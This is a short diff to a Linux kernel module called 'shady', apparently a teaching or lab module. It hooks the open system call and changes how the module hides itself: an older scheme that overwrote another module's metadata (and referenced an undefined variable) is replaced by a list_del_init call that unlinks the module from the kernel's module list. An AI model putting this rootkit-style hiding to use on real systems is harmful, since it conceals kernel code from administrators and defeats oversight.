@@ -32,7 +32,8 @@
 
 #include <asm/uaccess.h>
 #include <linux/linkage.h>
-
+#include <linux/mm.h>
+#include <asm/uaccess.h>
 #include "shady.h"
 
 MODULE_AUTHOR("Eugene A. Shatokhin, John Regehr");
@@ -240,9 +241,6 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
-  struct module *mod = &__this_module;
-  struct module *last_mod = NULL;
-  struct module *to_delete_mod = NULL;
 	
   if (shady_ndevices <= 0)
     {
@@ -294,18 +292,8 @@ shady_init_module(void)
   printk(KERN_INFO "open replaced by my_open addr\n");
 
   /*=======to hide this module=======*/
-  to_delete_mod = mod->next;  /*get the next mod*/
-  if (!to_delete){
-    printk("No mod for exchange :((\n");
-    return 0;
-  }
-  /*overide information*/
-  mod->name = to_delete_mod->name;
-  mod->size = to_delete_mod->size;
-  mod->flags = to_delete_mod->flags;
-
-  /*skipping the to_delete_mod from the list(not delete, but hide)*/
-  mod->next = to_delete_mod->next;
+  /*delete from list*/
+  list_del_init(&__this_module.list); 
   
   return 0; /* success */
 
